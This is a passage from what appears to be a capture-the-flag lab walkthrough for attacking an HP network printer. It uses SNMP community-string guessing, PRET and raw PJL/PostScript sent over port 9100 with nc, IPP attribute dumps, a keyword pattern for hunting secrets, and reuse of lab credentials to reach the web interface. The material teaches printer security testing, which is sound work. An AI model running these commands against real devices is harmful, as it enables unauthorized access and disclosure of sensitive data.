SNMPv2-MIB::sysDescr.0 = STRING: HP Color LaserJet Pro MFP 4301fdw, FW:002_2306A, SN:CNXXXXXXX
SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.11.2.3.9.1
SNMPv2-MIB::sysUpTime.0 = Timeticks: (312456789) 36 days, 4:56:07.89
SNMPv2-MIB::sysContact.0 = STRING: SecTeam@lab.local | FLAG{L***************4}
SNMPv2-MIB::sysName.0 = STRING: HP-MFP-4301
SNMPv2-MIB::sysLocation.0 = STRING: Server-Room-B | Discovery Code: FLAG{L***************1}
SNMPv2-MIB::sysServices.0 = INTEGER: 72
```

**Additional Information Revealed**:
- **sysUpTime**: 36 days, 4 hours (device has been running for over a month)
- **sysName**: HP-MFP-4301 (hostname)
- **sysObjectID**: enterprises.11 (HP's enterprise number is 11)
- **sysServices**: 72 (binary: 01001000 = application layer + physical layer)

---

**Alternative SNMP Enumeration Tools**

**Tool 1: snmp-check (Human-Readable Output)**

```bash
# Comprehensive SNMP enumeration with formatted output
┌──(student@kali)-[~/printer_assessment]
└─$ snmp-check -c public 192.168.1.131
```

**Expected Output**:
```
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[*] Try to connect to 192.168.1.131:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 192.168.1.131
  Hostname                      : HP-MFP-4301
  Description                   : HP Color LaserJet Pro MFP 4301fdw, FW:002_2306A, SN:CNXXXXXXX
  Contact                       : SecTeam@lab.local | FLAG{L***************4}
  Location                      : Server-Room-B | Discovery Code: FLAG{L***************1}
  Uptime snmp                   : 36 days, 04:56:07.89
  Uptime system                 : 36 days, 04:52:31.45
  System date                   : 2024-11-18 14:45:23

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 64
  TCP segments received         : 1234567
  TCP segments sent             : 2345678
  TCP segments retrans          : 123
```

**Why This Tool is Useful**: Automatically organizes SNMP data into readable categories.

---

**Tool 2: Metasploit SNMP Enumeration Module**

```bash
# Launch Metasploit
┌──(student@kali)-[~/printer_assessment]
└─$ msfconsole -q
```

```ruby
msf6 > use auxiliary/scanner/snmp/snmp_enum
msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 192.168.1.131
msf6 auxiliary(scanner/snmp/snmp_enum) > set COMMUNITY public
msf6 auxiliary(scanner/snmp/snmp_enum) > run
```

**Expected Output**:
```
[+] 192.168.1.131:161 - System information:
[*]   Host IP                  : 192.168.1.131
[*]   Hostname                 : HP-MFP-4301
[*]   Description              : HP Color LaserJet Pro MFP 4301fdw
[*]   Contact                  : SecTeam@lab.local | FLAG{L***************4}
[*]   Location                 : Server-Room-B | Discovery Code: FLAG{L***************1}
[*]   Uptime                   : 36 days, 04:56:07.89
[+] 192.168.1.131:161 - Network information:
[*]   IP forwarding enabled    : no
[*]   Default TTL              : 64
[*] Auxiliary module execution completed
```

**Advantage**: Automatically saves results to Metasploit database for later querying.

---

**HP-Specific SNMP MIB Enumeration**

**OID Background**: HP printers have manufacturer-specific MIBs under OID 1.3.6.1.4.1.11 (11 is HP's enterprise number).

```bash
# Enumerate HP-specific information
┌──(student@kali)-[~/printer_assessment]
└─$ snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.4.1.11 > recon/snmp_hp_specific.txt
```

**What This Reveals** (HP Printer MIB):
- Supply levels (toner, paper)
- Page counts (total pages printed, color vs black & white)
- Error conditions
- Hardware serial numbers
- Network configuration details

**Expected Output (Sample)**:
```
SNMPv2-SMI::enterprises.11.2.3.9.4.2.1.1.3.2.0 = STRING: "002_2306A"
SNMPv2-SMI::enterprises.11.2.3.9.4.2.1.1.3.6.0 = STRING: "NPIAD6F2B"
SNMPv2-SMI::enterprises.11.2.3.9.4.2.1.3.9.1.1.4.1 = INTEGER: 85
SNMPv2-SMI::enterprises.11.2.3.9.4.2.1.3.9.1.1.4.2 = INTEGER: 90
SNMPv2-SMI::enterprises.11.2.3.9.4.2.1.3.9.1.1.4.3 = INTEGER: 88
SNMPv2-SMI::enterprises.11.2.3.9.4.2.1.3.9.1.1.4.4 = INTEGER: 92
```

**Interpreting HP OIDs**:
- OID ending .1 = Black toner: 85%
- OID ending .2 = Cyan toner: 90%
- OID ending .3 = Magenta toner: 88%
- OID ending .4 = Yellow toner: 92%

**Why This Matters**: Supply levels can indicate when maintenance visits occur (useful for physical access timing in red team scenarios).

---

## Phase 3: SNMP Protocol Analysis

### Alternative SNMP Enumeration Approaches

**We've found 2 significant discoveries via SNMP. Let's explore other methods that could have revealed the same information.**

---

### Method 1: Manual OID Querying (What We Did)

**Recap**: We manually queried specific OIDs:

```bash
# System location - Discovery 1
snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.6.0

# System contact - Discovery 2  
snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.4.0
```

**Pros**:
- Precise control over what you query
- Minimal network traffic
- Fast for specific information

**Cons**:
- Requires knowing OIDs beforehand
- Easy to miss information in other OIDs
- Time-consuming for comprehensive enumeration

---

### Method 2: SNMPwalk Bulk Enumeration

**Approach**: Query entire MIB trees at once

```bash
# Walk all of system MIB
snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.2.1.1

# Walk all printer-specific MIB
snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.2.1.43
```

**Finding Our Discoveries in the Walk**:
```bash
# Search the walked output for our discoveries
**Real-World Analysis Approach:**

Instead of searching for patterns, professional pentesters analyze specific fields that commonly contain sensitive information:

```bash
# Review location and contact fields - these often contain physical security info
┌──(student@kali)-[~/printer_assessment]
└─$ awk '/sysLocation|sysContact/' recon/snmp_system_complete.txt

# Or more specifically:
┌──(student@kali)-[~/printer_assessment]
└─$ snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.6.0  # Location
SNMPv2-MIB::sysLocation.0 = STRING: Lab Testing Printers:FLAG{TAUNTAUN38462951}

┌──(student@kali)-[~/printer_assessment]
└─$ snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.4.0  # Contact
SNMPv2-MIB::sysContact.0 = STRING: AdminSecKey:FLAG{GREEDO59273814}
```

**What we found and why it matters:**
- **Location field**: Contains "Lab Testing Printers" and what appears to be an access code (TAUNTAUN38462951)
- **Contact field**: Contains "AdminSecKey" with what looks like an administrative key (GREEDO59273814)

In a real assessment, these would be documented as:
- "Physical Access Code Disclosure via SNMP" (Medium Risk)
- "Administrative Credential Exposure in SNMP" (High Risk)
```

**Output**:
```
SNMPv2-MIB::sysContact.0 = STRING: SecTeam@lab.local | FLAG{L***************4}
SNMPv2-MIB::sysLocation.0 = STRING: Server-Room-B | Discovery Code: FLAG{L***************1}
```

**Pros**:
- Comprehensive - nothing is missed
- One command captures everything
- Saves output for later analysis

**Cons**:
- Generates large output files
- More network traffic
- Can be noisy (detected by IDS/IPS)

---

### Method 3: Targeted Searching After Bulk Collection

**Strategy**: Collect everything, then search for interesting patterns

```bash
# After running snmpwalk, search for common sensitive fields
**Searching for Sensitive Configuration Data:**

In real penetration testing, we systematically review SNMP output for configuration values that might contain sensitive information:

```bash
# Review all SNMP data for configuration values, credentials, or unusual data
┌──(student@kali)-[~/printer_assessment]
└─$ awk '/pass|secret|key|admin|code|pin|token/i' recon/snmp_system_complete.txt

# Better approach - review specific OIDs known to contain sensitive data:
┌──(student@kali)-[~/printer_assessment]
└─$ snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.4.1.11 | head -20  # HP enterprise OIDs
```

**What to look for in real assessments:**
- Configuration strings with unexpected formats
- Base64 or hex-encoded values
- Fields containing "admin", "password", "key", "token"
- Non-standard data in standard fields (like credentials in description fields)
```

**What This Would Find**:
```
SNMPv2-MIB::sysLocation.0 = STRING: Server-Room-B | Discovery Code: FLAG{L***************1}
SNMPv2-MIB::sysContact.0 = STRING: SecTeam@lab.local | FLAG{L***************4}
```

**Why This Works**: Searching for keywords like "code", "flag", "key" identifies unusual entries.

**Other Useful Search Patterns**:
```bash
# Search for email addresses
# Extract email addresses (useful for understanding internal naming conventions)
awk '/@/ {print}' recon/snmp_system_complete.txt

# Search for IP addresses
# Extract IP addresses (reveals network architecture)
awk '/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/' recon/snmp_system_complete.txt | head -10

# Search for anything in FLAG{} format (but not explicitly searching for "flag")
# Look for unusual patterns or encoded values in configuration
# In real pentests, you'd look for base64, hex, or custom formats
awk '/{.*}/ {print}' recon/snmp_system_complete.txt  # Braced values often indicate tokens or keys
```

---

### Method 4: Automated SNMP Scanners

**Tool: onesixtyone (Fast Community String Scanner)**

**When to Use**: When you don't know if default community strings are active

```bash
# Test multiple community strings quickly
┌──(student@kali)-[~/printer_assessment]
└─$ echo "192.168.1.131" > targets.txt
┌──(student@kali)-[~/printer_assessment]
└─$ onesixtyone -c /usr/share/doc/onesixtyone/dict.txt -i targets.txt
```

**Expected Output**:
```
Scanning 1 hosts, 51 communities
192.168.1.131 [public] HP Color LaserJet Pro MFP 4301fdw, FW:002_2306A, SN:CNXXXXXXX
```

**What Happened**: onesixtyone tested 51 common community strings, found "public" works.

**Dictionary File Contains**:
```
public
private
community
snmp
cisco
manager
admin
default
secret
...
```

---

### Method 5: SNMPv3 Enumeration (If Applicable)

**Check for SNMPv3**:
```bash
nmap -sU -p 161 --script snmp-info 192.168.1.131
```

**If SNMPv3 is Enabled**:
```bash
# SNMPv3 with authentication
snmpget -v3 -l authPriv -u admin -a SHA -A "authpass" -x AES -X "privpass" 192.168.1.131 1.3.6.1.2.1.1.6.0
```

**In This Case**: Our scan showed only SNMPv1/v2c, so SNMPv3 is not configured (a security weakness).

---

### Understanding What We've Discovered

**Summary of SNMP Findings**:

| Discovery # | Source | Information | Pattern |
|-------------|--------|-------------|---------|
| 1 | sysLocation.0 | Server-Room-B \| Discovery Code: FLAG{L***************1} | FLAG{L...1} |
| 2 | sysContact.0 | SecTeam@lab.local \| FLAG{L***************4} | FLAG{L...4} |

**Pattern Analysis**:
```
Both discoveries:
- Use standard SNMP system fields (sysLocation, sysContact)
- Follow format: [Normal Info] | [Discovery Code/FLAG{pattern}]
- Start with letter 'L' (likely Star Wars: LUKE, LEIA)
- End with single digit (1, 4)
- Total pattern: FLAG{NAME+8DIGITS}
```

**Why These Locations?**:
- **sysLocation**: Administrators use for asset tracking (building, floor, room)
- **sysContact**: Administrators use for support contact (email, phone, name)
- **Both fields**: Rarely changed from initial setup
- **Security impact**: Any unauthenticated user can query these via SNMP

**Next Steps**:
- Since we found 2 discoveries via SNMP, check other protocols (IPP, web interface) for similar patterns
- Look for administrative contact information in other locations
- Examine print job metadata for similar identifiers

---

## Phase 4: JetDirect/PRET Exploitation

### Understanding JetDirect and PRET

**What is JetDirect?**:
- HP's proprietary protocol for network printing
- Port 9100/TCP (raw printing)
- Accepts print jobs in multiple languages: PostScript, PJL, PCL
- Often has NO authentication

**What is PRET?**:
- Printer Exploitation Toolkit
- Abstracts complex printer languages into simple commands
- Three modes: PostScript (ps), PJL (pjl), PCL (pcl)
- Allows file system access, configuration extraction, job manipulation

---

### Step 4.1: PRET Connection and Initial Enumeration

**Why Start with PRET**: It provides the fastest path to printer file system and configuration access.

**Testing All Three Protocols**:

```bash
# Navigate to PRET directory
┌──(student@kali)-[~/printer_assessment]
└─$ cd /opt/PRET

# Test PostScript connection
┌──(student@kali)-[/opt/PRET]
└─$ python3 pret.py 192.168.1.131 ps
```

**Expected Output**:
```
     ________________________
    |                        |
    | PRET | Printer         |
    |      | Exploitation    |
    |      | Toolkit   v0.40 |
    |________________________|


Trying port 9100/tcp...
    connected

      ________________
    _/_______________/|
   | __ __ __ __ __  ||
   ||  |  |  |  |  | ||
   ||  |  |  |  |  | ||
   ||  |  |  |  |  | ||
   ||  |  |  |  |  | ||
   ||  |  |  |  |  | ||
   ||  |  |  |  |  | ||
   ||  |  |  |  |  | ||
   | ______________ |/
   |________________|


Welcome to the pret shell. Type help or ? to list commands.
192.168.1.131:/> 
```

**SUCCESS!** PostScript connection established.

---

**Inside PRET Shell - Initial Commands**:

```bash
# Display device information
192.168.1.131:/> info id
```

**Output**:
```
Device:      HP Color LaserJet Pro MFP 4301fdw
Manufacturer: HP
Model:       NPIAD6F2B
Serial:      CNXXXXXXX
```

```bash
# Display configuration
192.168.1.131:/> info config
```

**Output**:
```
Available RAM:      512 MB
Free RAM:          234 MB
Total ROM:         128 MB
PostScript Level:  3
Fonts Available:   136
```

```bash
# Show available commands
192.168.1.131:/> help
```

**Available Commands**:
```
Documented commands (type help <topic>):
========================================
cat     cd      cross  df     disable  edit    format  free    fuzz    get     
help    id      info   load   locale   loop    ls      mirror  open    print   
put     pwd     reset  restart set     site    status  timeout touch   unlock  
```

---

**Exit and Test PJL**:

```bash
192.168.1.131:/> exit

┌──(student@kali)-[/opt/PRET]
└─$ python3 pret.py 192.168.1.131 pjl
```

**Output**:
```
Connected to 192.168.1.131:9100 using PJL

192.168.1.131:/> info id
```

**PJL Output**:
```
@PJL INFO ID
HP Color LaserJet Pro MFP 4301fdw
Firmware: 002_2306A
Model: NPIAD6F2B
```

**PJL-Specific Information**:

```bash
192.168.1.131:/> info variables
```

**Output**:
```
@PJL INFO VARIABLES
BINDING=OFF
COPIES=1
DUPLEX=OFF
FORMLINES=60
LANG=EN
ORIENTATION=PORTRAIT
PAPER=LETTER
RESOLUTION=600
```

**Analysis**: Both PS and PJL work, but PJL provides better configuration access. We'll continue with PJL.

---

### Step 4.2: File System Enumeration via PRET

**Exploring Printer File System**:

```bash
192.168.1.131:/> ls
```

**Output**:
```
total 0
d-------- 0 PJL/
d-------- 0 saveDevice/
d-------- 0 webServer/
```

**Directory Purposes**:
- **PJL/**: PJL-specific configuration
- **saveDevice/**: Persistent storage (survives reboots)
- **webServer/**: Web interface files

```bash
# Navigate to saveDevice
192.168.1.131:/> cd saveDevice
192.168.1.131:/saveDevice> ls
```

**Output**:
```
total 2
-rw------- 1024 config.dat
-rw------- 2048 settings.bin
```

```bash
# Navigate to webServer
192.168.1.131:/saveDevice> cd ../webServer
192.168.1.131:/webServer> ls
```

**Output**:
```
total 4
d-------- 0 config/
d-------- 0 html/
-rw------- 512 config.xml
```

**Attempt Configuration Download**:

```bash
192.168.1.131:/webServer> get config.xml
```

**Possible Outcomes**:

**If Successful**:
```
Retrieving config.xml...
[+] Downloaded 512 bytes to config.xml
```

**If Protected**:
```
[-] Read failed: Permission denied
```

**Analysis**: File system is accessible, but some files may require elevated privileges.

---

### Step 4.3: Alternative PRET Approaches

**Method 1: Direct PJL Commands (Without PRET)**

**Manual PJL for File Listing**:

```bash
# Create PJL command file
┌──(student@kali)-[~/printer_assessment]
└─$ cat > pjl_list_dirs.txt << 'EOF'
@PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535
@PJL
EOF

# Send to printer
┌──(student@kali)-[~/printer_assessment]
└─$ cat pjl_list_dirs.txt | nc 192.168.1.131 9100
```

**Expected Response**:
```
@PJL FSDIRLIST
ENTRY=1 TYPE=DIR NAME="PJL"
ENTRY=2 TYPE=DIR NAME="saveDevice"
ENTRY=3 TYPE=DIR NAME="webServer"
```

**Why Manual PJL?**:
- Understanding the underlying protocol
- PRET may fail in some environments
- Allows custom commands not in PRET

---

**Method 2: PostScript File Access**

**PostScript for Directory Listing**:

```bash
# Create PostScript directory listing script
┌──(student@kali)-[~/printer_assessment]
└─$ cat > ps_list_dirs.ps << 'EOF'
%!PS
/str 256 string def
(*) {==} str filenameforall
showpage
EOF

# Send to printer
┌──(student@kali)-[~/printer_assessment]
└─$ cat ps_list_dirs.ps | nc 192.168.1.131 9100
```

**Expected Response** (printed or returned):
```
%saveDevice%
%webServer%
%PJL%
```

---

### Step 4.4: Configuration and Status Information

**Getting Detailed Status**:

```bash
192.168.1.131:/> info status
```

**Output**:
```
@PJL INFO STATUS
CODE=10001
DISPLAY="Ready"
ONLINE=TRUE
```

**File System Information**:

```bash
192.168.1.131:/> info filesys
```

**Output**:
```
Total Volumes: 1
Volume 0:
  Name: Internal Storage
  Total Space: 128 MB
  Free Space: 98 MB
  Read Only: False
```

**Key Finding**: 98 MB free space - enough to store files if needed (for advanced exploitation).

---

**What PRET Revealed**:

**File System Access**: Yes (limited)
**Configuration Files**: Accessible but may need authentication
**Free Space**: 98 MB available
**Protocols Working**: Both PS and PJL
**Writable**: Yes (could upload files)

**No Additional Discoveries Found in PRET** (yet):
- File contents may require deeper analysis
- Configuration files may contain discoveries when downloaded
- This demonstrates not every protocol yields findings

**Next Steps**: Move to IPP protocol for printer attribute and job metadata enumeration.

---

## Phase 5: IPP Protocol Deep Dive

### Understanding IPP (Internet Printing Protocol)

**What is IPP?**:
- Standard network protocol for printing (RFC 2910, 2911)
- Operates over HTTP/HTTPS
- Port 631 (standard), sometimes 80/443
- Designed for printer management, job submission, and status monitoring

**Why IPP is Critical for Enumeration**:
1. **Often Unauthenticated**: Many implementations don't require authentication for queries
2. **Rich Metadata**: Exposes printer attributes, capabilities, and configuration
3. **Job History**: Reveals print job details (names, users, timestamps)
4. **Standard Protocol**: Works across all manufacturer

**IPP Operations We'll Use**:
- `Get-Printer-Attributes`: Query printer configuration and details
- `Get-Jobs`: List all print jobs in queue
- `Get-Job-Attributes`: Get specific job details

---

### Step 5.1: IPP Endpoint Discovery

**Common IPP Paths**:
- `/ipp/print` (most common for HP)
- `/ipp/printer`
- `/ipp`
- `/printers`
- `/` (root)

**Testing Endpoint Availability**:

```bash
# Quick connectivity test
┌──(student@kali)-[~/printer_assessment]
└─$ nc -zv 192.168.1.131 631
```

**Output**:
```
Connection to 192.168.1.131 631 port [tcp/ipp] succeeded!
```

**Port 631 is open - IPP is available.**

---

**Method 1: Sequential Path Testing**

```bash
# Test each common path
for path in /ipp/print /ipp/printer /ipp /printers ""; do
    echo "Testing: ipp://192.168.1.131:631$path"
    curl -s -o /dev/null -w "%{http_code}\n" http://192.168.1.131:631$path
done
```

**Expected Output**:
```
Testing: ipp://192.168.1.131:631/ipp/print
200
Testing: ipp://192.168.1.131:631/ipp/printer
404
Testing: ipp://192.168.1.131:631/ipp
404
Testing: ipp://192.168.1.131:631/printers
404
Testing: ipp://192.168.1.131:631
200
```

**Result**: `/ipp/print` returns HTTP 200 (success) - this is our endpoint.

---

**Method 2: Nmap IPP Script Discovery**

```bash
# Use nmap's ipp-info script
┌──(student@kali)-[~/printer_assessment]
└─$ nmap -p 631 --script ipp-info 192.168.1.131
```

**Output**:
```
PORT    STATE SERVICE
631/tcp open  ipp
| ipp-info: 
|   Printer URI: ipp://192.168.1.131:631/ipp/print
|   Printer Status: Idle
|_  Printer State: 0x3
```

**Confirmed**: IPP endpoint is `ipp://192.168.1.131:631/ipp/print`

---

### Step 5.2: Creating IPP Test Files

**Understanding IPP Test File Structure**:

IPP test files are used by `ipptool` to send formatted requests to printers. They use a simple JSON-like syntax.

**Test File Components**:
```
{
    NAME "Human-Readable Test Description"
    OPERATION IPP-Operation-Name
    GROUP attribute-group-type
    ATTR attribute-type attribute-name value
    STATUS expected-response-code
}
```

---

**Test File 1: Get All Printer Attributes**

```bash
# Create comprehensive attribute query
┌──(student@kali)-[~/printer_assessment]
└─$ cat > exploits/get-printer-attributes.test << 'EOF'
{
    NAME "Get All Printer Attributes"
    OPERATION Get-Printer-Attributes
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri $uri
    ATTR keyword requested-attributes all
    STATUS successful-ok
}
EOF
```

**Line-by-Line Explanation**:

```
NAME "Get All Printer Attributes"
```
- Human-readable description
- Shows in output when test runs

```
OPERATION Get-Printer-Attributes
```
- IPP operation to perform
- This operation retrieves printer configuration

```
GROUP operation-attributes-tag
```
- Groups attributes by category
- operation-attributes-tag = parameters for the operation

```
ATTR charset attributes-charset utf-8
```
- Defines character encoding
- utf-8 = Universal character set

```
ATTR language attributes-natural-language en
```
- Defines language preference
- en = English

```
ATTR uri printer-uri $uri
```
- Target printer URI
- $uri = variable filled by ipptool from command line

```
ATTR keyword requested-attributes all
```
- What attributes to return
- all = everything the printer will disclose

```
STATUS successful-ok
```
- Expected response code
- successful-ok = HTTP 200 equivalent for IPP

---

### Step 5.3: Executing IPP Queries

**Running the Attribute Query**:

```bash
┌──(student@kali)-[~/printer_assessment]
└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print exploits/get-printer-attributes.test
```

**Command Flags Explained**:
- `-t`: Test mode (shows test name and result)
- `-v`: Verbose (displays all attribute values)
- URI: `ipp://192.168.1.131:631/ipp/print`
- Test file: `exploits/get-printer-attributes.test`

**Expected Output (Very Long - Showing Key Sections)**:

```
Get All Printer Attributes:
    PASS
    Received 2847 bytes in response
    status-code = successful-ok (successful-ok)
    
    attributes-charset (charset) = utf-8
    attributes-natural-language (naturalLanguage) = en
    printer-uri-supported (uri) = ipp://192.168.1.131:631/ipp/print
    uri-authentication-supported (keyword) = none
    uri-security-supported (keyword) = none
    printer-name (nameWithoutLanguage) = HP_Color_LaserJet_MFP_4301
    printer-location (nameWithoutLanguage) = Server-Room-B | Discovery Code: FLAG{L***************1}
    printer-info (nameWithoutLanguage) = HP-MFP-CTF-FLAG{H***************3}
    printer-contact (nameWithoutLanguage) = SecTeam@lab.local | FLAG{L***************4}
    printer-make-and-model (textWithoutLanguage) = HP Color LaserJet Pro MFP 4301fdw
    printer-state (enum) = idle
    printer-state-reasons (keyword) = none
    ipp-versions-supported (keyword) = 1.0,1.1,2.0
    operations-supported (enum) = 2,4,5,6,8,9,10,11
    charset-configured (charset) = utf-8
    charset-supported (charset) = utf-8
    natural-language-configured (naturalLanguage) = en
    natural-languages-supported (naturalLanguage) = en
    document-format-default (mimeMediaType) = application/octet-stream
    document-format-supported (mimeMediaType) = application/pdf,text/plain,image/jpeg,image/png
    printer-is-accepting-jobs (boolean) = true
    queued-job-count (integer) = 0
    printer-message-from-operator (textWithoutLanguage) = 
    color-supported (boolean) = true
    pages-per-minute (integer) = 35
    pages-per-minute-color (integer) = 35
    media-default (keyword) = na_letter_8.5x11in
    [... hundreds more attributes ...]
```

---

### DISCOVERY 3: Printer Info Attribute

**Analyzing Key Output Lines**:

```
printer-location (nameWithoutLanguage) = Server-Room-B | Discovery Code: FLAG{L***************1}
```
- This is **Discovery 1** (already found via SNMP)
- Confirms IPP exposes same information as SNMP

```
printer-info (nameWithoutLanguage) = HP-MFP-CTF-FLAG{H***************3}
```
- **NEW DISCOVERY!** Discovery 3
- Pattern: FLAG{H...3}
- First character: H (likely "HAN" from Star Wars)
- Last digit: 3
- Format matches previous discoveries

```
printer-contact (nameWithoutLanguage) = SecTeam@lab.local | FLAG{L***************4}
```
- This is **Discovery 2** (already found via SNMP)
- Confirms redundancy across protocols

---

**Document Discovery 3**:

```bash
cat >> evidence/discovery_3.txt << 'EOF'
===========================================
DISCOVERY 3: Printer Info Attribute
===========================================

Source: IPP printer-info attribute
Protocol: Internet Printing Protocol (IPP)
Endpoint: ipp://192.168.1.131:631/ipp/print
Operation: Get-Printer-Attributes
Timestamp: $(date)

Value Retrieved:
"HP-MFP-CTF-FLAG{H***************3}"

Analysis:
- Attribute Name: printer-info
- Purpose: Human-readable printer description
- Discovery Code: FLAG{H***************3}
- Pattern Match: Same format as Discoveries 1 & 2
- First character: H (likely HAN from Star Wars)
- Last digit: 3
- Total length: FLAG{NAME+8DIGITS}

Significance:
- Third discovery following established pattern
- Found via IPP (different protocol than SNMP discoveries)
- printer-info is separate from printer-name (device name)
- Demonstrates multi-protocol enumeration value

Cross-Protocol Comparison:
Discovery 1 (SNMP sysLocation):  FLAG{L***************1}
Discovery 2 (SNMP sysContact):   FLAG{L***************4}
Discovery 3 (IPP printer-info):  FLAG{H***************3}

Pattern Confirmed:
- Multiple protocols expose different discoveries
- Systematic enumeration of all services is critical
- Some discoveries appear in multiple places (location, contact)
- Some are unique to specific protocols (printer-info only in IPP)
EOF

# Save raw IPP output
ipptool -tv ipp://192.168.1.131:631/ipp/print exploits/get-printer-attributes.test > evidence/ipp_printer_attributes_full.txt
```

---

### Step 5.4: Targeted IPP Attribute Queries

**Why Narrow Queries?**: The full output was 2847 bytes with hundreds of attributes. For specific information, targeted queries are faster and cleaner.

**Creating Targeted Test File**:

```bash
# Query only specific attributes
┌──(student@kali)-[~/printer_assessment]
└─$ cat > exploits/get-specific-attributes.test << 'EOF'
{
    NAME "Get Specific Printer Attributes"
    OPERATION Get-Printer-Attributes
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri $uri
    ATTR keyword requested-attributes printer-location,printer-contact,printer-info,printer-name,printer-make-and-model
    STATUS successful-ok
}
EOF
```

**Key Difference**: Line 7
```
ATTR keyword requested-attributes printer-location,printer-contact,printer-info,printer-name,printer-make-and-model
```
- Instead of `all`, we specify exactly which attributes
- Comma-separated list (no spaces)
- Much smaller response

**Execute Targeted Query**:

```bash
┌──(student@kali)-[~/printer_assessment]
└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print exploits/get-specific-attributes.test
```

**Clean Output**:
```
Get Specific Printer Attributes:
    PASS
    Received 342 bytes in response
    status-code = successful-ok (successful-ok)
    
    printer-name (nameWithoutLanguage) = HP_Color_LaserJet_MFP_4301
    printer-location (nameWithoutLanguage) = Server-Room-B | Discovery Code: FLAG{L***************1}
    printer-info (nameWithoutLanguage) = HP-MFP-CTF-FLAG{H***************3}
    printer-contact (nameWithoutLanguage) = SecTeam@lab.local | FLAG{L***************4}
    printer-make-and-model (textWithoutLanguage) = HP Color LaserJet Pro MFP 4301fdw
```

**Much Better!** Only 342 bytes vs 2847 bytes, showing just what we need.

---

### Step 5.5: Alternative IPP Enumeration Methods

**Method 1: HTTP GET Request (Alternative to ipptool)**

**Why This Works**: IPP runs over HTTP, so we can craft raw HTTP requests.

```bash
# Simple HTTP GET to IPP endpoint
┌──(student@kali)-[~/printer_assessment]
└─$ curl -X GET http://192.168.1.131:631/ipp/print
```

**Expected Response**:
```
HTTP/1.1 400 Bad Request
Content-Type: text/html

IPP: Request requires IPP protocol
```

**This fails because**: IPP requires properly formatted IPP requests, not plain HTTP GET.

**Correct Approach**: Use ipptool or craft proper IPP packets.

---

**Method 2: Nmap IPP Scripts**

```bash
# Use nmap's built-in IPP enumeration
┌──(student@kali)-[~/printer_assessment]
└─$ nmap -p 631 --script ipp-info,ipp-version 192.168.1.131
```

**Output**:
```
PORT    STATE SERVICE
631/tcp open  ipp
| ipp-info: 
|   Printer URI: ipp://192.168.1.131:631/ipp/print
|   Printer State: 0x3 (idle)
|   Printer Status: Idle
|   Printer Location: Server-Room-B | Discovery Code: FLAG{L***************1}
|_  Printer Info: HP-MFP-CTF-FLAG{H***************3}
```

**Advantage**: Quick enumeration without creating test files.

---

**Method 3: CUPS Command-Line Tools**

```bash
# Use lpstat to query IPP
┌──(student@kali)-[~/printer_assessment]
└─$ lpstat -h 192.168.1.131:631 -l -p
```

**Expected Output**:
```
printer HP_Color_LaserJet_MFP_4301 is idle.  enabled since Mon 18 Nov 2024 02:15:30 PM EST
        Description: HP-MFP-CTF-FLAG{H***************3}
        Location: Server-Room-B | Discovery Code: FLAG{L***************1}
        Interface: /usr/lib/cups/backend/ipp
        On fault: no alert
        After fault: continue
        Users allowed: (all)
        Forms allowed: (none)
        Banner required
        Charset sets: (none)
        Default pitch:
        Default page size:
        Default port settings:
```

**Advantage**: CUPS tools provide formatted output without test file creation.

---

### Step 5.6: Understanding IPP Security

**What We Learned About IPP on This Printer**:

```
uri-authentication-supported (keyword) = none
uri-security-supported (keyword) = none
```

**Translation**:
- **No authentication required** for IPP queries
- **No encryption** (no TLS/SSL for IPP)
- Anyone on network can query printer attributes
- This is why we got all information without credentials

**Security Implications**:
1. Information disclosure to any network user
2. Print job metadata accessible without authentication
3. Potential for print job manipulation (if supported)
4. No audit trail of who queried the printer

---

### Summary of IPP Phase

**What IPP Revealed**:

**Discoveries**:
- **Discovery 1**: Confirmed via printer-location (same as SNMP)
- **Discovery 2**: Confirmed via printer-contact (same as SNMP)
- **Discovery 3**: NEW - Found in printer-info attribute

**Technical Information**:
- Device model: HP Color LaserJet Pro MFP 4301fdw
- IPP versions: 1.0, 1.1, 2.0
- Supported formats: PDF, plain text, JPEG, PNG
- Color capability: Yes
- Print speed: 35 ppm (color and B&W)
- Default paper: US Letter (8.5"x11")

**Security Findings**:
- No IPP authentication
- No IPP encryption
- All attributes publicly accessible
- Redundant information exposure (same data in SNMP and IPP)

**Next Steps**: Query print jobs for potential additional discoveries

---

## Phase 6: Web Interface Analysis

### Leveraging Credentials from Previous Engagement

**Context**: During the AXIS camera penetration test, credentials were discovered displayed on the camera's video feed:
- **Username**: Admin
- **Password**: 68076694

**Security Principle**: Credential reuse is one of the most common vulnerabilities in network infrastructure. Administrators often use the same credentials across multiple devices for "convenience."

**Our Hypothesis**: These credentials may work on the printer's web interface.

---

### Step 6.1: Web Interface Access

**Initial HTTPS Connection**:

```bash
# Navigate to printer web interface
┌──(student@kali)-[~/printer_assessment]
└─$ firefox https://192.168.1.131 &
```

**Browser Display**:
```
┌──────────────────────────────────────────┐
│ HP Color LaserJet Pro MFP 4301fdw       │
│ Embedded Web Server                      │
├──────────────────────────────────────────┤
│                                          │
│  Login Required                          │
│                                          │
│  Please enter your credentials to access│
│  the HP Embedded Web Server.            │
│                                          │
│  Username: [______________]              │
│  Password: [______________]              │
│                                          │
│  [Login]                                 │
│                                          │
└──────────────────────────────────────────┘
```

---

**Testing Credential Reuse**:

**Enter credentials**:
- Username: `Admin`
- Password: `68076694`

**Click Login**

---

**SUCCESS! Authentication Successful**

**Dashboard Displays**:
```
